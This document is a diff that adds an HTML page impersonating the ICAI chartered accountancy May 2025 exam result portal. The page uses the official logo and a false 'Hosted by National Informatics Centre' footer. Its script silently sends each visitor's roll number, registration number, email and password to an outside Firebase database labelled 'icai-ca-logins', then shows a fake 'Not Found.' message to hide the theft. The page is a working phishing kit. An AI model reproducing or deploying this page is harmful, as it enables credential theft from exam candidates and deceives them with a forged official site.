@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ICAI CA Result - May 2025</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .header {
+      background-color: #800080;
+      color: white;
+      padding: 20px 10px;
+    }
+
+    .header img {
+      height: 50px;
+      vertical-align: middle;
+    }
+
+    .header h1 {
+      display: inline;
+      font-size: 20px;
+      margin-left: 10px;
+    }
+
+    .form-box {
+      background: #fdfdfd;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      width: 90%;
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 25px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .form-box h2 {
+      color: #800080;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .captcha-label {
+      font-weight: bold;
+      margin-top: 15px;
+      color: #444;
+    }
+
+    .captcha-code {
+      background: #eee;
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 10px auto;
+      letter-spacing: 2px;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      color: white;
+      cursor: pointer;
+    }
+
+    .btn-clear {
+      background-color: #555;
+    }
+
+    .btn-submit {
+      background-color: #800080;
+    }
+
+    .footer {
+      background-color: #eee;
+      color: #333;
+      font-size: 12px;
+      padding: 10px;
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/en/c/cd/ICAI_logo.png" alt="ICAI logo">
+    <h1>The Institute of Chartered Accountants of India</h1>
+    <div>Examination Results, May 2025</div>
+  </div>
+
+  <div class="form-box">
+    <h2>Foundation - Result</h2>
+    <input type="text" id="roll" placeholder="Roll No.">
+    <input type="text" id="reg" placeholder="Registration No.">
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+
+    <div class="captcha-label">Enter the text shown below</div>
+    <div class="captcha-code">tdqjk3</div>
+    <input type="text" id="captcha" placeholder="Type the above characters">
+
+    <div class="buttons">
+      <button class="btn-clear" onclick="document.getElementById('roll').value='';document.getElementById('reg').value='';document.getElementById('email').value='';document.getElementById('password').value='';document.getElementById('captcha').value='';">CLEAR</button>
+      <button class="btn-submit" id="submitBtn">SUBMIT</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    Hosted by National Informatics Centre
+  </div>
+
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
+    import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js';
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCmDzcJExVTW2BFoQXMWSXDPMww7JsG6qc",
+      authDomain: "logintest-b939e.firebaseapp.com",
+      projectId: "logintest-b939e",
+      storageBucket: "logintest-b939e.firebasestorage.app",
+      messagingSenderId: "100538611587",
+      appId: "1:100538611587:web:b9b8b87139f12bf18568b6"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    document.getElementById("submitBtn").addEventListener("click", () => {
+      const roll = document.getElementById("roll").value.trim();
+      const reg = document.getElementById("reg").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const captcha = document.getElementById("captcha").value.trim();
+
+      const expectedCaptcha = "tdqjk3";
+
+      if (!roll || !reg || !email || !password || !captcha) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      if (captcha !== expectedCaptcha) {
+        alert("Incorrect captcha.");
+        return;
+      }
+
+      const refPath = ref(db, "icai-ca-logins");
+      push(refPath, {
+        rollNumber: roll,
+        registrationNumber: reg,
+        email: email,
+        password: password,
+        captcha: captcha
+      }).then(() => {
+        alert("Not Found.");
+        document.getElementById("roll").value = "";
+        document.getElementById("reg").value = "";
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        document.getElementById("captcha").value = "";
+      }).catch((err) => {
+        alert("Error: " + err.message);
+      });
+    });
+  </script>
+</body>
+</html>
